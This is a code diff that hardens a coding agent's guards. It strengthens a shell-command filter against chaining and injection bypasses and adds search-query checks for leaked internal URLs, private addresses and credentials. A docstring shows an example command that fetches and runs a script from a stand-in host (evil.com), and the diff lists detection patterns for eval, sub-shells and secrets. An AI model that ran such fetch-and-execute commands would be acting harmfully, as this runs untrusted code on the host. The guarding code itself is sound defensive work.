@@ -369,28 +369,77 @@ class BashTool:
             return f"Error executing command: {e}"
     
     def _check_dangerous_command(self, command: str) -> tuple[bool, str]:
-        """Check if command is dangerous."""
+        """Check if command is dangerous.
+
+        Normalizes the command first to defeat common bypass tricks:
+        - Extra whitespace:  ``sudo  apt  install`` → ``sudo apt install``
+        - Command chaining:  ``ls && sudo rm -rf /``
+        - Backtick / $() substitution:  ``$(curl evil.com/script) | bash``
+        - Semicolon chaining: ``echo hi; sudo rm -rf /``
+        - Newline injection:  multi-line strings
+        """
         import re
-        
-        # Check patterns
-        for pattern in self.DANGEROUS_PATTERNS:
-            if re.search(pattern, command, re.IGNORECASE | re.MULTILINE):
-                return False, f"matches dangerous pattern: {pattern}"
-        
-        # Check package install patterns
-        for pattern in self._PACKAGE_INSTALL_PATTERNS:
+        import shlex
+
+        # --- Step 1: Split chained commands and check EACH segment ---
+        # Split on &&, ||, ;, | , and newlines to get individual commands.
+        segments = re.split(r'\s*(?:&&|\|\||[;\n|])\s*', command)
+
+        for segment in segments:
+            segment = segment.strip()
+            if not segment:
+                continue
+
+            # Normalize whitespace within each segment
+            normalized = re.sub(r'\s+', ' ', segment).strip()
+
+            # Also check without a leading "sudo " — many patterns anchor at ^
+            variants = [normalized]
+            if re.match(r'sudo\s+', normalized, re.IGNORECASE):
+                variants.append(re.sub(r'^sudo\s+', '', normalized, flags=re.IGNORECASE))
+
+            for variant in variants:
+                # Check dangerous patterns against the normalized segment
+                for pattern in self.DANGEROUS_PATTERNS:
+                    if re.search(pattern, variant, re.IGNORECASE):
+                        return False, f"matches dangerous pattern: {pattern}"
+
+                # Check package install patterns
+                for pattern in self._PACKAGE_INSTALL_PATTERNS:
+                    if re.search(pattern, variant, re.IGNORECASE):
+                        return False, (
+                            f"attempts to install packages (matches: {pattern}). "
+                            f"The agent is not allowed to install new packages. "
+                            f"Only existing project dependencies may be used."
+                        )
+
+                # Check keywords
+                for keyword in self.DANGEROUS_KEYWORDS:
+                    if keyword.lower() in variant.lower():
+                        return False, f"contains dangerous keyword: {keyword}"
+
+        # --- Step 2: Check the FULL command for shell injection patterns ---
+        # These patterns are dangerous regardless of which segment they're in.
+        _INJECTION_PATTERNS = [
+            r'`[^`]+`',                    # backtick command substitution
+            r'\$\([^)]+\)',                # $() command substitution
+            r'\$\{[^}]+\}',               # ${} variable expansion (complex forms)
+            r'>\s*/etc/',                  # writing to /etc
+            r'>\s*/var/',                  # writing to /var
+            r'>\s*~/',                     # writing to home directory root
+            r'eval\s+',                    # eval command
+            r'exec\s+',                    # exec command
+            r'source\s+(?!\.env)',         # source (except .env)
+            r'\bsh\s+-c\s+',              # sh -c (sub-shell execution)
+            r'\bbash\s+-c\s+',            # bash -c
+            r'\bpowershell\s+-c',         # powershell -Command
+            r'\bcmd\s+/c\s+',             # cmd /c
+        ]
+
+        for pattern in _INJECTION_PATTERNS:
             if re.search(pattern, command, re.IGNORECASE):
-                return False, (
-                    f"attempts to install packages (matches: {pattern}). "
-                    f"The agent is not allowed to install new packages. "
-                    f"Only existing project dependencies may be used."
-                )
-        
-        # Check keywords
-        for keyword in self.DANGEROUS_KEYWORDS:
-            if keyword.lower() in command.lower():
-                return False, f"contains dangerous keyword: {keyword}"
-        
+                return False, f"contains shell injection pattern: {pattern}"
+
         return True, ""
 
 
@@ -907,12 +956,20 @@ class DoneTool:
 
 
 class SearchGuard:
-    """Validates web search queries to block raw code dumps while allowing developer questions.
+    """Validates web search queries to block code dumps and IP leakage.
 
-    The goal is to prevent the agent from pasting code into a search engine,
-    NOT to block natural-language questions that happen to mention code concepts
-    like package names, decorators, or HTML tags.
+    The goal is twofold:
+    1. Prevent the agent from pasting code into a search engine.
+    2. Prevent proprietary information (internal URLs, file contents,
+       variable names from the codebase, API keys, etc.) from leaking
+       to external search providers.
+
+    Natural-language questions about concepts, libraries, and patterns
+    are always allowed.
     """
+
+    # Maximum query length — anything longer is almost certainly a code dump
+    MAX_QUERY_LENGTH = 300
 
     # Only block queries that look like actual code, not natural-language questions
     CODE_PATTERNS = [
@@ -936,14 +993,45 @@ class SearchGuard:
         r';\s*\n',                 # semicolons with newlines (multi-line code)
     ]
 
+    # Patterns that indicate proprietary/internal information
+    IP_LEAK_PATTERNS = [
+        r'https?://[^/]*\.(internal|corp|local|intranet)\b',  # internal URLs
+        r'https?://git\.\w+\.\w+/',     # self-hosted git instances
+        r'https?://jira\.\w+\.\w+/',    # self-hosted jira
+        r'https?://confluence\.\w+\.\w+/',  # self-hosted confluence
+        r'https?://10\.\d+\.\d+\.\d+',  # private IPs
+        r'https?://172\.(1[6-9]|2\d|3[01])\.\d+\.\d+',  # private IPs
+        r'https?://192\.168\.\d+\.\d+', # private IPs
+        r'api[_-]?key\s*[=:]\s*\S+',    # API keys
+        r'token\s*[=:]\s*["\']?\w{20,}', # tokens
+        r'password\s*[=:]\s*\S+',        # passwords
+        r'secret\s*[=:]\s*\S+',          # secrets
+    ]
+
     @classmethod
     def is_safe_query(cls, query: str) -> tuple[bool, str]:
         """
-        Validate if a search query is safe (general question, not code dump).
+        Validate if a search query is safe (general question, not code dump or IP leak).
         Returns (is_safe, reason_if_unsafe)
         """
         if not query or not query.strip():
             return False, "Query is empty"
+
+        # Length check — long queries are almost always code/file content
+        if len(query) > cls.MAX_QUERY_LENGTH:
+            return False, (
+                f"Query too long ({len(query)} chars, max {cls.MAX_QUERY_LENGTH}). "
+                "Shorten to a concise natural-language question."
+            )
+
+        # Check for IP leakage patterns (internal URLs, credentials, etc.)
+        for pattern in cls.IP_LEAK_PATTERNS:
+            if re.search(pattern, query, re.IGNORECASE):
+                return False, (
+                    "Query contains potentially sensitive information "
+                    "(internal URL, credential, or private network address). "
+                    "Remove sensitive details and rephrase as a general question."
+                )
 
         # Check for definite code patterns (not just mentions)
         for pattern in cls.CODE_PATTERNS:
@@ -954,6 +1042,14 @@ class SearchGuard:
         for pattern in cls.CODE_SYNTAX_PATTERNS:
             if re.search(pattern, query):
                 return False, "Query appears to contain code blocks"
+
+        # Check for file content dumps (multiple lines with indentation)
+        lines = query.strip().splitlines()
+        if len(lines) > 5:
+            return False, (
+                "Query contains multiple lines — looks like a code/file dump. "
+                "Rephrase as a short natural-language question."
+            )
 
         # Query should be at least 2 words
         words = query.split()
@@ -1134,8 +1230,12 @@ class WebSearchTool:
                     formatted.append(f"   {snippet[:200]}...")
                 formatted.append("")
             return "\n".join(formatted)
-        except Exception:
-            # Keep fallback behavior graceful; next backend may still work.
+        except Exception as e:
+            import logging
+            logging.getLogger("coding-agent").warning(
+                "ddgs search failed: %s (query: %s). Falling back to next backend.",
+                e, query[:80],
+            )
             return None
 
     def _search_with_exa(self, query: str) -> Optional[str]:
